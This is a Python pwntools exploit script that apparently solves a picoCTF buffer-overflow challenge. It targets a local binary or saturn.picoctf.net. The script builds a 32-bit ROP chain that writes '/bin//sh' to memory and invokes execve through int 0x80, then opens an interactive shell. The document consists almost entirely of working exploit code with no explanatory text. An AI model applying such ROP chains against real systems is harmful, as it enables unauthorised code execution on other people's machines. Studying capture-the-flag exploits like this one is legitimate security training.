
from pwn import * 
from struct import pack
exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 62727)

    return r

def main():
	r = conn()
	input()
	

# Padding goes here
	p = b'A'*28

	p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
	p += pack('<I', 0x080e5060) # @ .data
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x080b073a) # pop eax ; ret
	p += b'/bin'
	p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
	p += pack('<I', 0x080e5064) # @ .data + 4
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x080b073a) # pop eax ; ret
	p += b'//sh'
	p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
	p += pack('<I', 0x080e5068) # @ .data + 8
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
	p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x08049022) # pop ebx ; ret
	p += pack('<I', 0x080e5060) # @ .data
	p += pack('<I', 0x08049e29) # pop ecx ; ret
	p += pack('<I', 0x080e5068) # @ .data + 8
	p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
	p += pack('<I', 0x080e5068) # @ .data + 8
	p += pack('<I', 0x080e5060) # padding without overwrite ebx
	p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0808054e) # inc eax ; ret
	p += pack('<I', 0x0804a3c2) # int 0x80
	r.sendlineafter(b'grasshopper!\n', p)
	pause()
	r.interactive()
if __name__ == "__main__":
	main()